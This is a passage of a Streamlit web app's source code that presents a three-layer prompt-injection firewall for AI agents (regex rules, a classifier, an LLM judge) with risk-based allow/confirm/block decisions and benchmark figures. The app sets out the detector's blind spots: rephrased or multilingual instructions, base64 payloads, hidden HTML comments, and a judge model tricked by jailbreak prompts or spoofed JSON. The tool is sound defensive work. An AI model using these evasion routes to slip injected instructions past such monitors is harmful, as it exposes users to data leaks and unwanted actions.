    judge_note = "Precomputed for benchmark inputs; offline for arbitrary custom text."
elif judge_layer:
    judge_pill = "<span class='status-pill-checked'>Checked</span>"
    judge_note = f"Score: <strong style='color:#22D3EE;'>{judge_pct}%</strong> | Latency: <strong>{judge_time}</strong>"
else:
    judge_pill = "<span class='status-pill-skipped'>Not invoked</span>"
    judge_note = "Not invoked."

st.markdown(
    f"""
    <div class="layer-cards-grid">
      <div class="layer-card-container">
        <div>
          <div class="layer-card-header">
            <div class="layer-card-title-wrap">{ICON_RULES_SVG} Layer 1: Rules</div>
            <span class="status-pill-checked">Checked</span>
          </div>
          <div class="layer-desc-text">Instantly scans for known attack patterns, hidden HTML comments, and base64 payloads.</div>
          <div class="layer-meta-text">
            Score: <strong style="color:#22D3EE;">{rules_pct}%</strong> | Latency: <strong>{rules_time}</strong>
          </div>
        </div>
        <div style="margin-top:8px;">{chips_html}</div>
        <div class="layer-card-progress-track">
          <div class="layer-card-progress-fill" style="width: {rules_pct}%;"></div>
        </div>
      </div>

      <div class="layer-card-container">
        <div>
          <div class="layer-card-header">
            <div class="layer-card-title-wrap">{ICON_CLASSIFIER_SVG} Layer 2: ML Classifier</div>
            {pill_html}
          </div>
          <div class="layer-desc-text">Statistical model trained on attack grammar to catch rephrased or multilingual variants.</div>
          <div class="layer-meta-text">{note_text}</div>
        </div>
        <div class="layer-sub-text">Calibrated Logistic Regression</div>
        <div class="layer-card-progress-track">
          <div class="layer-card-progress-fill" style="width: {clf_pct}%;"></div>
        </div>
      </div>

      <div class="layer-card-container">
        <div>
          <div class="layer-card-header">
            <div class="layer-card-title-wrap">{ICON_JUDGE_SVG} Layer 3: AI Judge</div>
            {judge_pill}
          </div>
          <div class="layer-desc-text">Deep reasoning LLM invoked only in the uncertain score band [0.35, 0.75] to save cost.</div>
          <div class="layer-meta-text">{judge_note}</div>
        </div>
        <div class="layer-sub-text">Ollama llama3.2:3b / Prompt v2</div>
        <div class="layer-card-progress-track">
          <div class="layer-card-progress-fill" style="width: {judge_pct}%;"></div>
        </div>
      </div>
    </div>
    """,
    unsafe_allow_html=True,
)

st.subheader("Action-Aware Decisions Across Danger Levels")
st.caption("The exact same content triggers different safeguards based on the danger of the tool:")

all_decisions = policy_instance.decide_all(result.suspicion)
dec_col1, dec_col2, dec_col3 = st.columns(3)

for i, (col, risk_lvl) in enumerate(zip([dec_col1, dec_col2, dec_col3], RiskLevel)):
    d = all_decisions[risk_lvl]
    with col:
        st.markdown(f"**{risk_lvl.value.upper()} RISK TOOL**")
        if risk_lvl == RiskLevel.LOW:
            st.caption("E.g. read email, web search, view docs")
        elif risk_lvl == RiskLevel.MEDIUM:
            st.caption("E.g. save note, draft reply, edit calendar")
        else:
            st.caption("E.g. send email, delete files, payment")

        if d == Decision.ALLOW:
            st.success(f"**{d.value}** — Proceed safely")
        elif d == Decision.ASK:
            st.warning(f"**{d.value}** — Confirm with user")
        else:
            st.error(f"**{d.value}** — Block immediately")

with st.expander("What does this mean? (Plain-English Explanations)", expanded=False, icon=":material/help:"):
    st.markdown(
        """
        **Suspicion Score (0% to 100%):**
        - 0% indicates normal, harmless workplace conversation or standard documentation.
        - 100% indicates unambiguous malicious instructions or command overrides.
        - Scores in the middle (35%–75%) represent ambiguous or borderline phrasing.
        - Multiple layers combine: regex catches blatant tricks; machine learning catches subtle phrasing.

        **Tool Risk Level (Blast Radius):**
        - Low-risk tools (search, read-only view) cannot cause external damage or leak credentials.
        - Medium-risk tools (saving drafts, updating records) have moderate consequences if tricked.
        - High-risk tools (sending emails, making payments, running commands) can leak confidential data.
        - Higher tool danger demands stricter safety thresholds before the AI is allowed to act.

        **The Action-Aware Policy Table:**
        - Rather than a rigid all-or-nothing block, the firewall tailors reactions to tool consequences.
        - Slightly suspicious text is allowed to perform safe searches, but blocked from sending emails.
        - "Ask the User" places a human in the loop for borderline cases rather than failing silently.
        - This eliminates alert fatigue for everyday tasks while keeping critical actions airtight.
        """
    )
    st.markdown(build_policy_matrix_html(), unsafe_allow_html=True)

# ---------------------------------------------------------------------------
# SECTION 5: WHY LAYERS? (Defense-in-Depth Comparison)
# ---------------------------------------------------------------------------
st.markdown("---")
st.markdown('<h2 id="why-layers" class="section-heading">Why Layers?</h2>', unsafe_allow_html=True)
st.markdown(
    "No single detection technique is sufficient to secure an AI agent. "
    "A resilient firewall requires defense-in-depth where complementary layers cover each other's blind spots."
)

why_col1, why_col2, why_col3 = st.columns(3)
with why_col1:
    with st.container(border=True):
        st.markdown(
            f"""
            <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
              {ICON_RULES_SVG}
              <span style="font-size:18px; font-weight:700; color:#E8ECF8;">Regex Rules</span>
            </div>
            <p style="font-size:15px; color:#A9B3D1; margin-bottom:12px;"><strong>Speed:</strong> &lt;1 ms | <strong>Cost:</strong> Free</p>
            <p style="font-size:15px; color:#22C55E; margin-bottom:6px;"><strong>✓ Strengths:</strong> Deterministic, instantaneous. Catches known delimiters, raw Base64, and hidden HTML comments without GPU compute.</p>
            <p style="font-size:15px; color:#F87171; margin:0;"><strong>✗ Blind spots:</strong> Misses creative synonyms, multilingual attacks, or rephrased instructions that avoid literal keywords.</p>
            """,
            unsafe_allow_html=True,
        )

with why_col2:
    with st.container(border=True):
        st.markdown(
            f"""
            <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
              {ICON_CLASSIFIER_SVG}
              <span style="font-size:18px; font-weight:700; color:#E8ECF8;">ML Classifier</span>
            </div>
            <p style="font-size:15px; color:#A9B3D1; margin-bottom:12px;"><strong>Speed:</strong> ~25 ms | <strong>Cost:</strong> Minimal</p>
            <p style="font-size:15px; color:#22C55E; margin-bottom:6px;"><strong>✓ Strengths:</strong> Statistical n-gram & TF-IDF model. Catches paraphrased commands and multilingual patterns (e.g. Hinglish).</p>
            <p style="font-size:15px; color:#F87171; margin:0;"><strong>✗ Blind spots:</strong> Lacks semantic understanding of complex multi-step workflows or contextual user instructions.</p>
            """,
            unsafe_allow_html=True,
        )

with why_col3:
    with st.container(border=True):
        st.markdown(
            f"""
            <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
              {ICON_JUDGE_SVG}
              <span style="font-size:18px; font-weight:700; color:#E8ECF8;">AI Judge</span>
            </div>
            <p style="font-size:15px; color:#A9B3D1; margin-bottom:12px;"><strong>Speed:</strong> ~3.5 s | <strong>Cost:</strong> High</p>
            <p style="font-size:15px; color:#22C55E; margin-bottom:6px;"><strong>✓ Strengths:</strong> Deep reasoning LLM. Understands nuanced conversational context, intent, and indirect injections.</p>
            <p style="font-size:15px; color:#F87171; margin:0;"><strong>✗ Blind spots:</strong> 100x slower, expensive, and can be tricked by adversarial jailbreak prompts or spoofed JSON.</p>
            """,
            unsafe_allow_html=True,
        )

st.markdown(
    f"""
    <div class="callout-info" style="margin-top:20px;">
      <strong>The Gated Cascade Advantage:</strong>
      {GATED_CASCADE_ADVANTAGE}
    </div>
    """,
    unsafe_allow_html=True,
)

# ---------------------------------------------------------------------------
# SECTION 6: BENCHMARKS & LIMITATIONS (Real Ablation Stats & Scope Limitations)
# ---------------------------------------------------------------------------
st.markdown("---")
st.markdown('<h2 id="benchmarks" class="section-heading">Benchmarks</h2>', unsafe_allow_html=True)
st.markdown("Performance measured on real attack samples and tricky normal messages.")

stats = load_benchmark_results()

metric_col1, metric_col2, metric_col3, metric_col4 = st.columns(4)
with metric_col1:
    st.metric("Rules + Classifier Catch Rate", stats.get("rules_classifier_catch", "83.9%"))
    st.caption("Evaluated at ~24 ms latency")

with metric_col2:
    st.metric("Full Cascade Catch Rate", stats.get("full_cascade_catch", "85.7%"))
    st.caption("With gated LLM judge fallback")

with metric_col3:
    st.metric("False Alarm Rate", stats.get("rules_classifier_fp", "5.1%"))
    st.caption("Benign messages incorrectly flagged")

with metric_col4:
    st.metric("Benchmark Samples", str(stats.get("sample_count", 115)))
    st.caption("Diverse hand-written test suite")

st.markdown(
    f"""
    <div class="callout-amber">
      <strong>⚠️ Limitations & Scope:</strong> {stats.get('note', 'exploratory set, small sample, see limitations')}.
      All figures are parsed directly from benchmark results files (see <code>results/ablation_fresh_ollama_v2.md</code>).
    </div>
    """,
    unsafe_allow_html=True,
)

with st.expander("Known Weaknesses & Empirical Failure Modes (from docs/limitations.md)", expanded=False, icon=":material/report:"):
    st.markdown("### Known Weaknesses")
    for idx, (title, desc) in enumerate(LIMITATIONS_ITEMS, 1):
        st.markdown(f"**{idx}. {title}:**\n{desc}")
    st.markdown("---")
    st.markdown("### No Novelty Claim")
    st.markdown(NO_NOVELTY_CLAIM)

# ---------------------------------------------------------------------------
# SITE FOOTER
# ---------------------------------------------------------------------------
st.markdown(build_footer_html(AUTHOR_NAME, BRAND_NAME, LIVE, LINKS), unsafe_allow_html=True)

from streamlit.runtime import exists as _runtime_exists

if not _runtime_exists():
    st._main._form_data = None
    from streamlit.delta_generator import context_dg_stack as _ctx_dg_stack
    _ctx_dg_stack.set(())
